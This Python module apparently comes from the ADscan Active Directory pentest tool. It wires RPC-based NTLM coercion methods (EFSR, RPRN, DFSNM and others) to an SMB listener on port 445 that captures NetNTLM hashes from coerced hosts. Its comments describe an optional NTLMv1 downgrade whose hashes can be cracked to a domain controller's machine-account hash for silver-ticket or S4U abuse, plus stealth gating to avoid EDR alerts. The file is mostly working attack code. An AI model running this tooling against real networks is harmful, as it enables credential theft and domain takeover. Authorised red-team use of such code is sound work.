"""Reusable NTLM capture workflows for listeners and coercion triggers.

This module provides a small orchestration layer for workflows that need to:

- start an async SMB capture listener in the background
- trigger outbound authentication with ADscan's native async coercion stack
- observe the capture queue and classify NTLMv1 vs NTLMv2

The listener is the native ``SMBNtlmCaptureSource`` from
``services.relay.smb_ntlm_capture``; this module wraps it behind a
synchronous ``start()/stop()/wait_for_capture()`` interface for callers that
are not running on an asyncio event loop.

Stop-on-real-capture seam
-------------------------
The listener runs on its own background asyncio loop in a dedicated thread; the
native coercion trigger runs synchronously on the calling thread (via
``run_async_sync``). Because the two run concurrently, the listener can confirm
a REAL inbound NTLM capture *while* the coercion catalog is still being walked.
``NativeListenerCapture.make_capture_signal()`` returns a thread-safe predicate
that the coercion engine polls between attempts: the moment a matching capture
lands, the engine stops walking the catalog. This is the only authoritative
stop condition - a clean RPC return never ends the run.
"""

from __future__ import annotations

import asyncio
from dataclasses import dataclass, field
import subprocess
import time
from typing import Any, Callable, Iterable, Mapping

import queue as _queue
import threading

from aiosmb.commons.connection.factory import SMBConnectionFactory

from adscan_internal.services.async_bridge import run_async_sync
from adscan_internal.services.coercion.core import CaptureSignal
from adscan_internal.services.coercion.runner import (
    NativeCoercionRunConfig,
    run_native_coercion,
)


RunCommand = Callable[..., subprocess.CompletedProcess[str] | None]


def build_socks5_proxies(proxy_spec: str | None) -> list | None:
    """Build a single-hop SOCKS5 proxy list from a ``host:port`` string.

    Returns ``None`` when ``proxy_spec`` is empty so callers can pass the
    result straight through to ``SMBConnectionFactory.from_components(...,
    proxies=...)`` without changing behaviour when no proxy is requested.

    The proxy ``endpoint_ip``/``endpoint_port`` are intentionally left unset:
    the asysocks client fills them from the connection target at connect time
    when a single proxy is configured. Only ``server_ip``/``server_port``/
    ``protocol`` are required here.

    Args:
        proxy_spec: A ``host:port`` SOCKS5 endpoint (e.g. ``127.0.0.1:1080``),
            or ``None``/empty to disable proxying.

    Returns:
        A one-element list of ``UniProxyTarget`` for the native stack, or
        ``None`` when no proxy was requested.

    Raises:
        ValueError: When ``proxy_spec`` is non-empty but not ``host:port``.
    """

    spec = str(proxy_spec or "").strip()
    if not spec:
        return None

    from asysocks.unicomm.common.proxy import (  # noqa: PLC0415
        UniProxyProto,
        UniProxyTarget,
    )

    host, sep, port_text = spec.rpartition(":")
    if not sep or not host.strip() or not port_text.strip():
        raise ValueError(
            f"Invalid SOCKS5 proxy specification (expected host:port): {spec!r}"
        )
    try:
        port = int(port_text.strip())
    except ValueError as exc:
        raise ValueError(
            f"Invalid SOCKS5 proxy port in specification: {spec!r}"
        ) from exc

    proxy = UniProxyTarget()
    proxy.server_ip = host.strip()
    proxy.server_port = port
    proxy.protocol = UniProxyProto.CLIENT_SOCKS5_TCP
    return [proxy]


def looks_like_ntlm_hash(value: str) -> bool:
    """Return whether ``value`` looks like a bare NT hash.

    Delegates to the central
    :func:`adscan_internal.services.credential_routing.looks_like_ntlm_hash`
    so the format definition stays single-sourced. Re-exported here as a
    backward-compat alias for existing callers in this module.
    """
    from adscan_internal.services.credential_routing import (
        looks_like_ntlm_hash as _central,
    )

    return _central(value)


@dataclass(frozen=True)
class NtlmCaptureObservation:
    """A single NTLM authentication capture observed by the listener."""

    raw_user: str
    clean_user: str
    ntlm_version: str
    fullhash: str


@dataclass(frozen=True)
class InboundConnectionSummary:
    """Inbound-connection tally observed by the listener during the window.

    This is the diagnostic that splits a "no capture" outcome into a
    reachability problem (``total_connections == 0`` - the target never routed
    back to the listener) versus a real auth-type signal (``> 0`` inbound but
    no NTLM completed from the PDC). ``source_ips`` is stored raw here; callers
    must apply :func:`mark_sensitive` before rendering it.
    """

    total_connections: int = 0
    source_ips: tuple[str, ...] = ()
    handshake_stages: tuple[tuple[str, int], ...] = ()
    ntlm_seen: bool = False


@dataclass(frozen=True)
class NtlmCaptureProbeResult:
    """Result of a single coercion-to-capture workflow run."""

    success: bool
    auth_type: str | None
    observation: NtlmCaptureObservation | None
    reason: str | None
    trigger_command: list[str]
    trigger_auth_mode: str | None
    attempted_trigger_auth_modes: tuple[str, ...]
    trigger_returncode: int | None
    trigger_stdout: str
    trigger_stderr: str
    trigger_error_kind: str | None
    trigger_error_detail: str | None
    listener_returncode: int | None
    listener_expected_stop: bool
    inbound: InboundConnectionSummary = field(default_factory=InboundConnectionSummary)


@dataclass(frozen=True)
class NativeCoercionExecution:
    """Outcome of one native coercion trigger attempt."""

    auth_mode: str
    command: list[str]
    returncode: int
    stdout: str
    stderr: str
    error_kind: str | None
    error_detail: str | None


class NativeCoercionTrigger:
    """Run ADscan native coercion as an NTLM capture trigger."""

    def run(
        self,
        *,
        target: str,
        listener_ip: str,
        username: str,
        secret: str,
        domain: str,
        timeout_seconds: int,
        auth_type: str = "smb",
        dc_ip: str | None = None,
        method_filter: str | None = None,
        use_kerberos: bool = False,
        env: dict[str, str] | None = None,
        proxies: list | None = None,
        capture_signal: CaptureSignal | None = None,
    ) -> NativeCoercionExecution:
        """Execute native coercion and return subprocess-like metadata.

        ``capture_signal`` is the authoritative stop condition forwarded to the
        coercion engine: when it reports a real inbound capture the engine stops
        walking the catalog. When ``None`` the engine walks the whole ordered
        catalog and stops only on timeout.
        """

        del env
        command = _native_trigger_command(
            target=target,
            listener_ip=listener_ip,
            domain=domain,
            auth_type=auth_type,
            method_filter=method_filter,
            use_kerberos=use_kerberos,
        )
        try:
            result = run_async_sync(
                _run_native_coercion_trigger(
                    target=target,
                    listener_ip=listener_ip,
                    username=username,
                    secret=secret,
                    domain=domain,
                    timeout_seconds=timeout_seconds,
                    auth_type=auth_type,
                    dc_ip=dc_ip,
                    method_filter=method_filter,
                    use_kerberos=use_kerberos,
                    proxies=proxies,
                    capture_signal=capture_signal,
                )
            )
        except Exception as exc:  # noqa: BLE001 - converted to structured probe result
            return NativeCoercionExecution(
                auth_mode="kerberos" if use_kerberos else "smb",
                command=command,
                returncode=1,
                stdout="",
                stderr=str(exc),
                error_kind=type(exc).__name__,
                error_detail=str(exc),
            )

        summary = (
            f"native coercion captured={result.captured} attempts={result.attempts} "
            f"timed_out={result.timed_out}"
        )
        if result.captured and result.probable_results:
            first = result.probable_results[-1]
            summary += f" probable_method={first.protocol}/{first.method_name}"
        elif not result.captured:
            failures = [
                f"{attempt.protocol}/{attempt.method_name}:{attempt.error or attempt.error_code or 'no-capture'}"
                for attempt in result.results[:5]
            ]
            if failures:
                summary += " attempts_detail=" + "; ".join(failures)

        # ``returncode == 0`` means the coercion engine ran to completion (or
        # was stopped by a real capture). Capture confirmation is owned by the
        # listener, not by this returncode, so it is not gated on
        # ``result.captured`` - the workflow reads the listener queue for the
        # authoritative verdict.
        return NativeCoercionExecution(
            auth_mode="kerberos" if use_kerberos else "smb",
            command=command,
            returncode=0,
            stdout=summary,
            stderr="",
            error_kind=None,
            error_detail=None,
        )


def _normalize_expected_usernames(values: Iterable[str]) -> set[str]:
    """Normalize candidate usernames for case-insensitive comparisons."""

    normalized: set[str] = set()
    for value in values:
        candidate = str(value or "").strip()
        if candidate:
            normalized.add(candidate.casefold())
    return normalized


def _to_inbound_summary(stats: object) -> InboundConnectionSummary:
    """Convert a listener ``InboundConnectionStats`` to the workflow summary.

    Duck-typed on purpose so the workflow layer does not import the relay
    module's dataclass at module scope (the relay imports are kept lazy).
    """

    handshake_stages = getattr(stats, "handshake_stages", {}) or {}
    return InboundConnectionSummary(
        total_connections=int(getattr(stats, "total_connections", 0) or 0),
        source_ips=tuple(getattr(stats, "source_ips", ()) or ()),
        handshake_stages=tuple(sorted(handshake_stages.items())),
        ntlm_seen=bool(getattr(stats, "ntlm_seen", False)),
    )


async def _run_native_coercion_trigger(
    *,
    target: str,
    listener_ip: str,
    username: str,
    secret: str,
    domain: str,
    timeout_seconds: int,
    auth_type: str,
    dc_ip: str | None,
    method_filter: str | None,
    use_kerberos: bool,
    proxies: list | None = None,
    capture_signal: CaptureSignal | None = None,
):
    secret_type = "nt" if looks_like_ntlm_hash(secret) else "password"
    # When Kerberos auth is requested, aiosmb derives the ``cifs/<target>`` SPN
    # from this very ``target`` argument. A short hostname or IP yields a
    # ticket the server rejects (same pattern as LDAP/SMB); promote to FQDN.
    if use_kerberos:
        from adscan_internal.services._kerberos_spn import (
            normalize_kerberos_target_hostname,
        )

        spn_target = normalize_kerberos_target_hostname(target, domain) or target
    else:
        spn_target = target
    factory = SMBConnectionFactory.from_components(
        spn_target,
        username,
        secret,
        secrettype=secret_type,
        domain=domain,
        dcip=dc_ip or target,
        authproto="kerberos" if use_kerberos else "ntlm",
        proxies=proxies,
    )
    protocols, method_names = _native_filter_from_method(method_filter)
    return await run_native_coercion(
        connection_factory=factory,
        target_host=target,
        config=NativeCoercionRunConfig(
            listener_host=listener_ip,
            listener_auth_type="http" if auth_type.lower() == "http" else "smb",
            timeout_seconds=float(timeout_seconds),
            protocols=protocols,
            method_names=method_names,
            capture_signal=capture_signal,
            show_summary=False,
        ),
    )


def _native_filter_from_method(
    method_filter: str | None,
) -> tuple[tuple[str, ...], tuple[str, ...]]:
    """Translate an operator ``--method`` filter into engine selectors.

    With no filter the run walks the ENTIRE ordered catalog (empty protocol
    tuple = no protocol restriction), so vectors like MS-RPRN that coerce a
    single-homed member are always attempted. The previous default narrowed to
    EFSR+RPRN only, which - combined with the false-positive early stop - meant
    the run frequently never reached RPRN.
    """

    candidate = str(method_filter or "").strip()
    if not candidate:
        return (), ()
    normalized = candidate.upper().replace("MS-", "")
    if normalized in {"EFSR", "RPRN", "DFSNM", "FSRVP", "EVEN"}:
        return (normalized,), ()
    return (), (candidate,)


def _native_trigger_command(
    *,
    target: str,
    listener_ip: str,
    domain: str,
    auth_type: str,
    method_filter: str | None,
    use_kerberos: bool,
) -> list[str]:
    command = [
        "adscan-native-coercion",
        "--target",
        target,
        "--listener",
        listener_ip,
        "--domain",
        domain,
        "--auth-type",
        auth_type,
    ]
    if method_filter:
        command.extend(["--method", method_filter])
    if use_kerberos:
        command.append("--kerberos")
    return command


def should_force_ntlm_downgrade(
    domain_data: Mapping[str, Any] | None,
    ip: str,
    *,
    stealth: bool = False,
) -> bool:
    """Decide whether to force an NTLMv1 downgrade against ``ip``. SSOT.

    The gate (owner directive): downgrade only when the host is KNOWN v1-capable
    — i.e. the auth-type sweep already classified it ``NTLMv1`` in
    ``domain_data["ntlm_auth_type_by_host"][ip]`` — AND we are not operating under
    max-stealth. The pinned ``1122334455667788`` challenge is the Responder IOC
    (MDI/EDR alert), so it must never fire under stealth, and there is no value in
    forcing it against a v2-only host (the client returns v2 regardless).

    Args:
        domain_data: The per-domain state (``shell.domains_data[domain]``).
        ip: The target host IP whose verdict to consult.
        stealth: True when max-stealth posture forbids the Responder IOC.

    Returns:
        True only for a host with a persisted ``NTLMv1`` verdict and no stealth.
    """
    if stealth:
        return False
    host_map = (domain_data or {}).get("ntlm_auth_type_by_host") or {}
    if not isinstance(host_map, Mapping):
        return False
    verdict = host_map.get(str(ip)) or {}
    if not isinstance(verdict, Mapping):
        return False
    return str(verdict.get("ntlm_auth_type") or "").strip() == "NTLMv1"


class NativeListenerCapture:
    """SMB relay listener backed by ``aiosmb`` for active coercion capture.

    Exposes a synchronous ``start() / stop() / wait_for_capture()`` interface
    that runs the async ``SMBNtlmCaptureSource`` on a background asyncio event
    loop in a dedicated thread and bridges captured NTLM observations to a
    ``threading.Queue`` for synchronous consumption.

    Every observation is also recorded in a thread-safe side buffer so
    :meth:`make_capture_signal` can report a real capture live (while the
    coercion trigger is still walking the catalog) without consuming from the
    ``wait_for_capture`` queue.
    """

    exit_returncode: int | None = None
    exit_expected_stop: bool = False

    def __init__(
        self,
        *,
        listen_host: str = "0.0.0.0",
        listen_port: int = 445,
        force_ntlm_downgrade: bool = False,
    ) -> None:
        self.listen_host = listen_host
        self.listen_port = listen_port
        # NTLMv1 downgrade-capture (Responder --disable-ess parity). Default OFF.
        # A caller sets this True only against a KNOWN v1-capable host and outside
        # max-stealth posture — the pinned challenge is the Responder IOC. When on,
        # a v1-capable client returns a crack.sh-rainbow-crackable plain NetNTLMv1
        # (on a DC: the machine-account NT hash → silver ticket / S4U).
        self.force_ntlm_downgrade = force_ntlm_downgrade
        self._capture_queue: _queue.Queue[NtlmCaptureObservation] = _queue.Queue()
        self._thread: threading.Thread | None = None
        self._loop: asyncio.AbstractEventLoop | None = None
        self._stop_event: asyncio.Event | None = None
        self._source: object | None = None
        self._inbound: InboundConnectionSummary = InboundConnectionSummary()
        # Live, thread-safe record of every observation seen so far, used by
        # ``make_capture_signal`` for stop-on-real-capture. Independent of the
        # consume queue so the final ``wait_for_capture`` still drains normally.
        self._observed_lock = threading.Lock()
        self._observed: list[NtlmCaptureObservation] = []
        # Exception captured from a failed start() bind. The background loop
        # swallows it, so this is the ONLY place the real reason (EACCES
        # privileged-port denial vs EADDRINUSE conflict) is recoverable;
        # describe_start_error() classifies it for the caller.
        self._start_error: BaseException | None = None

    def connection_stats(self) -> InboundConnectionSummary:
        """Return the inbound-connection tally observed by the listener.

        Safe to call after :meth:`stop`. While the listener runs it returns a
        live snapshot from the source; once stopped it returns the final
        snapshot captured in the background loop's teardown.
        """
        source = self._source
        if source is not None:
            try:
                stats = source.connection_stats
                return _to_inbound_summary(stats)
            except Exception:  # noqa: BLE001 - never let observability raise
                return self._inbound
        return self._inbound

    def drain_observations(self) -> list[NtlmCaptureObservation]:
        """Return a thread-safe snapshot of every observation seen so far.

        Additive read-only accessor for the shared-listener fan-out pattern: a
        single listener collects captures from many concurrent coercion
        triggers, and the caller attributes each observation to its coerced host
        by matching ``clean_user`` to the expected ``<host>$`` computer account.
        Reuses the same ``_observed`` buffer that backs
        :meth:`make_capture_signal` without consuming the
        :meth:`wait_for_capture` queue, so the single-target probe path is
        unaffected. Safe to call while the listener is running and after
        :meth:`stop`.
        """

        with self._observed_lock:
            return list(self._observed)

    def make_capture_signal(
        self, expected_usernames: Iterable[str] | None = None
    ) -> CaptureSignal:
        """Return a thread-safe predicate that is True once a REAL capture lands.

        The predicate matches the same ``expected_usernames`` filter the final
        :meth:`wait_for_capture` uses (empty filter = accept any principal), so
        the coercion engine stops only on a capture the workflow would attribute
        to the target - never on a clean RPC return.
        """

        expected = _normalize_expected_usernames(expected_usernames or [])

        def _signal() -> bool:
            with self._observed_lock:
                observed = tuple(self._observed)
            for obs in observed:
                if expected and obs.clean_user.casefold() not in expected:
                    continue
                return True
            return False

        return _signal

    def clear_database(self) -> None:
        """No-op — native listener has no persistent state to clear."""

    def start(self) -> bool:
        """Start the SMB relay listener in a background thread."""

        ready_event = threading.Event()
        error_holder: list[Exception] = []

        def _run_loop() -> None:
            loop = asyncio.new_event_loop()
            self._loop = loop
            asyncio.set_event_loop(loop)
            try:
                loop.run_until_complete(self._async_main(ready_event, error_holder))
            finally:
                loop.close()

        self._thread = threading.Thread(target=_run_loop, daemon=True, name="native-smb-listener")
        self._thread.start()
        ready_event.wait(timeout=5.0)
        if error_holder:
            self._start_error = error_holder[0]
            return False
        return True

    def describe_start_error(self) -> tuple[str, str]:
        """Classify why :meth:`start` failed into ``(code, operator_message)``.

        ``code`` is a short, host/secret-free tag suitable for telemetry
        (``eacces`` / ``eaddrinuse`` / ``eaddrnotavail`` / ``other`` / ``none``);
        the message is a Rich-safe operator string. Returns ``("none", "")`` when
        :meth:`start` did not fail. Walks the exception cause chain for an
        ``OSError`` errno so a wrapped bind error is still classified.
        """
        import errno as _errno  # noqa: PLC0415

        exc = self._start_error
        if exc is None:
            return "none", ""
        host, port = self.listen_host, self.listen_port
        found: int | None = None
        seen: set[int] = set()
        cur: BaseException | None = exc
        while cur is not None and id(cur) not in seen:
            seen.add(id(cur))
            if isinstance(cur, OSError) and cur.errno is not None:
                found = cur.errno
                break
            cur = cur.__cause__ or cur.__context__
        if found == _errno.EACCES:
            return "eacces", (
                f"permission denied binding privileged port {port} on {host} "
                f"(EACCES). The runtime runs as a non-root container user and "
                f"lacks privileged-port access; it needs CAP_NET_BIND_SERVICE so "
                f"the coercion-based NTLM capture listener can bind."
            )
        if found == _errno.EADDRINUSE:
            return "eaddrinuse", (
                f"port {port} on {host} is already in use (EADDRINUSE) — another "
                f"service or a stale listener holds it; free it and retry."
            )
        if found == _errno.EADDRNOTAVAIL:
            return "eaddrnotavail", (
                f"listener IP {host} is not available inside the runtime "
                f"(EADDRNOTAVAIL) — the interface is missing in the container."
            )
        from rich.markup import escape  # noqa: PLC0415

        return "other", escape(f"{type(exc).__name__}: {exc}")

    async def _async_main(
        self,
        ready_event: threading.Event,
        error_holder: list[Exception],
    ) -> None:
        from adscan_internal.services.relay.smb_ntlm_capture import (  # noqa: PLC0415
            SMBNtlmCaptureConfig,
            SMBNtlmCaptureSource,
            extract_ntlm_hash,
        )

        config = SMBNtlmCaptureConfig(
            listen_host=self.listen_host,
            listen_port=self.listen_port,
            force_ntlm_downgrade=self.force_ntlm_downgrade,
        )
        gssapi_queue: asyncio.Queue[object] = asyncio.Queue()
        source = SMBNtlmCaptureSource(config, gssapi_queue)
        self._source = source
        self._stop_event = asyncio.Event()

        try:
            await source.start()
        except Exception as exc:  # noqa: BLE001
            error_holder.append(exc)
            ready_event.set()
            return

        ready_event.set()

        try:
            while not self._stop_event.is_set():
                try:
                    gssapi = await asyncio.wait_for(gssapi_queue.get(), timeout=0.5)
                except asyncio.TimeoutError:
                    continue

                result = extract_ntlm_hash(gssapi)
                if result is None:
                    continue

                raw_user = (
                    f"{result.domain}\\{result.username}"
                    if result.domain and result.username
                    else (result.username or "")
                )
                observation = NtlmCaptureObservation(
                    raw_user=raw_user,
                    clean_user=result.username or "",
                    ntlm_version=result.ntlm_version,
                    fullhash=result.fullhash,
                )
                with self._observed_lock:
                    self._observed.append(observation)
                self._capture_queue.put(observation)
        finally:
            try:
                self._inbound = _to_inbound_summary(source.connection_stats)
            except Exception:  # noqa: BLE001 - best-effort observability
                pass
            await source.stop()

    def stop(self) -> None:
        """Stop the background listener."""

        if self._loop is not None and self._stop_event is not None:
            self._loop.call_soon_threadsafe(self._stop_event.set)
        if self._thread is not None:
            self._thread.join(timeout=5.0)

    def wait_for_capture(
        self,
        *,
        timeout_seconds: int,
        expected_usernames: Iterable[str] | None = None,
        poll_interval_seconds: float = 1.0,
    ) -> NtlmCaptureObservation | None:
        """Wait for the first matching NTLM capture from the native listener."""

        deadline = time.time() + max(timeout_seconds, 1)
        expected = _normalize_expected_usernames(expected_usernames or [])

        while time.time() < deadline:
            remaining = deadline - time.time()
            try:
                obs = self._capture_queue.get(timeout=min(poll_interval_seconds, max(remaining, 0.01)))
            except _queue.Empty:
                continue

            if expected and obs.clean_user.casefold() not in expected:
                continue
            return obs

        return None


def run_ntlm_capture_probe(
    *,
    listener: NativeListenerCapture,
    trigger: NativeCoercionTrigger,
    target: str,
    listener_ip: str,
    username: str,
    secret: str,
    domain: str,
    expected_usernames: Iterable[str],
    capture_timeout_seconds: int,
    trigger_timeout_seconds: int,
    auth_type: str = "smb",
    trigger_auth_mode: str = "smb",
    trigger_env: dict[str, str] | None = None,
    dc_ip: str | None = None,
    method_filter: str | None = None,
    proxies: list | None = None,
    listener_ready_delay_seconds: float = 2.0,
    post_trigger_wait_seconds: float = 2.0,
    sleep_fn: Callable[[float], None] = time.sleep,
) -> NtlmCaptureProbeResult:
    """Run a coercion-to-capture probe and classify the observed NTLM auth type.

    The coercion trigger walks the entire ordered method catalog, but is handed
    a ``capture_signal`` bound to the listener so it stops the instant a REAL
    inbound NTLM capture matching ``expected_usernames`` is observed. The
    listener queue then yields the authoritative observation for classification.
    """

    if not listener.start():
        return NtlmCaptureProbeResult(
            success=False,
            auth_type=None,
            observation=None,
            reason="listener_start_failed",
            trigger_command=[],
            trigger_auth_mode=None,
            attempted_trigger_auth_modes=(),
            trigger_returncode=None,
            trigger_stdout="",
            trigger_stderr="",
            trigger_error_kind=None,
            trigger_error_detail=None,
            listener_returncode=None,
            listener_expected_stop=False,
        )

    trigger_command: list[str] = []
    trigger_result: NativeCoercionExecution | None = None
    trigger_error_kind: str | None = None
    trigger_error_detail: str | None = None
    expected_list = list(expected_usernames)
    try:
        listener.clear_database()
        sleep_fn(max(listener_ready_delay_seconds, 0.0))
        capture_signal = listener.make_capture_signal(expected_list)
        trigger_execution = trigger.run(
            target=target,
            listener_ip=listener_ip,
            username=username,
            secret=secret,
            domain=domain,
            timeout_seconds=trigger_timeout_seconds,
            auth_type=auth_type,
            use_kerberos=trigger_auth_mode == "kerberos",
            env=trigger_env,
            dc_ip=dc_ip,
            method_filter=method_filter,
            proxies=proxies,
            capture_signal=capture_signal,
        )
        trigger_command = trigger_execution.command
        trigger_result = trigger_execution
        trigger_error_kind = trigger_execution.error_kind
        trigger_error_detail = trigger_execution.error_detail
        sleep_fn(max(post_trigger_wait_seconds, 0.0))
        observation = listener.wait_for_capture(
            timeout_seconds=capture_timeout_seconds,
            expected_usernames=expected_list,
        )
    finally:
        listener.stop()

    inbound = listener.connection_stats()

    if observation is not None:
        return NtlmCaptureProbeResult(
            success=True,
            auth_type=observation.ntlm_version,
            observation=observation,
            reason=None,
            trigger_command=trigger_command,
            trigger_auth_mode=trigger_auth_mode,
            attempted_trigger_auth_modes=(trigger_auth_mode,),
            trigger_returncode=(
                trigger_result.returncode if trigger_result is not None else None
            ),
            trigger_stdout=trigger_result.stdout if trigger_result else "",
            trigger_stderr=trigger_result.stderr if trigger_result else "",
            trigger_error_kind=trigger_error_kind,
            trigger_error_detail=trigger_error_detail,
            listener_returncode=listener.exit_returncode,
            listener_expected_stop=listener.exit_expected_stop,
            inbound=inbound,
        )

    reason = "capture_not_observed"
    if listener.exit_returncode is not None and not listener.exit_expected_stop:
        reason = "listener_exited_during_capture"

    return NtlmCaptureProbeResult(
        success=False,
        auth_type=None,
        observation=None,
        reason=reason,
        trigger_command=trigger_command,
        trigger_auth_mode=trigger_auth_mode,
        attempted_trigger_auth_modes=(trigger_auth_mode,),
        trigger_returncode=(
            trigger_result.returncode if trigger_result is not None else None
        ),
        trigger_stdout=trigger_result.stdout if trigger_result else "",
        trigger_stderr=trigger_result.stderr if trigger_result else "",
        trigger_error_kind=trigger_error_kind,
        trigger_error_detail=trigger_error_detail,
        listener_returncode=listener.exit_returncode,
        listener_expected_stop=listener.exit_expected_stop,
        inbound=inbound,
    )
